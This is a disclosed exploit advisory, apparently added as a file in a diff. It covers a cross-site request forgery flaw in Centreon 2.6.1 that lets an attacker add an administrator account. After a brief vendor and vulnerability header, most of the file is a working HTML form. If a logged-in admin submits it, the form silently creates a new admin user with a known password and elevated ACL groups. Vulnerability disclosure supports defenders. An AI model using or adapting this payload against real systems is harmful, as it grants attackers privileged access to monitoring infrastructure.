@@ -1,0 +1,75 @@
+
+Centreon 2.6.1 CSRF Add Admin Exploit
+
+
+Vendor: Centreon
+Product web page: https://www.centreon.com
+Affected version: 2.6.1 (CES 3.2)
+
+Summary: Centreon is the choice of some of the world's largest
+companies and mission-critical organizations for real-time IT
+performance monitoring and diagnostics management.
+
+Desc: The application allows users to perform certain actions
+via HTTP requests without performing any validity checks to
+verify the requests. This can be exploited to perform certain
+actions with administrative privileges if a logged-in user
+visits a malicious web site.
+
+Tested on: CentOS 6.6 (Final)
+           Apache/2.2.15
+           PHP/5.3.3
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2015-5263
+Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2015-5263.php
+
+
+10.08.2015
+
+--
+
+
+<html>
+  <body>
+    <form action="'http://localhost.localdomain/centreon/main.php?p=60301" method="POST">
+      <input type="hidden" name="contact_alias" value="Testingus" />
+      <input type="hidden" name="contact_name" value="Fullio" />
+      <input type="hidden" name="contact_email" value="test@test.tld" />
+      <input type="hidden" name="contact_pager" value="" />
+      <input type="hidden" name="contact_template_id" value="" />
+      <input type="hidden" name="contact_enable_notifications[contact_enable_notifications]" value="2" />
+      <input type="hidden" name="timeperiod_tp_id" value="" />
+      <input type="hidden" name="timeperiod_tp_id2" value="" />
+      <input type="hidden" name="contact_oreon[contact_oreon]" value="1" />
+      <input type="hidden" name="contact_passwd" value="123123" />
+      <input type="hidden" name="contact_passwd2" value="123123" />
+      <input type="hidden" name="contact_lang" value="en_US" />
+      <input type="hidden" name="contact_admin[contact_admin]" value="1" />
+      <input type="hidden" name="contact_autologin_key" value="" />
+      <input type="hidden" name="contact_auth_type" value="local" />
+      <input type="hidden" name="contact_acl_groups[]" value="31" />
+      <input type="hidden" name="contact_acl_groups[]" value="32" />
+      <input type="hidden" name="contact_acl_groups[]" value="34" />
+      <input type="hidden" name="contact_address1" value="Neverland" />
+      <input type="hidden" name="contact_address2" value="" />
+      <input type="hidden" name="contact_address3" value="101" />
+      <input type="hidden" name="contact_address4" value="" />
+      <input type="hidden" name="contact_address5" value="" />
+      <input type="hidden" name="contact_address6" value="" />
+      <input type="hidden" name="contact_activate[contact_activate]" value="1" />
+      <input type="hidden" name="contact_comment" value="comment-vuln-xss-t00t" />
+      <input type="hidden" name="action[action]" value="1" />
+      <input type="hidden" name="submitA" value="Save" />
+      <input type="hidden" name="contact_register" value="1" />
+      <input type="hidden" name="contact_id" value="" />
+      <input type="hidden" name="o" value="a" />
+      <input type="hidden" name="initialValues" value="a:0:{}" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
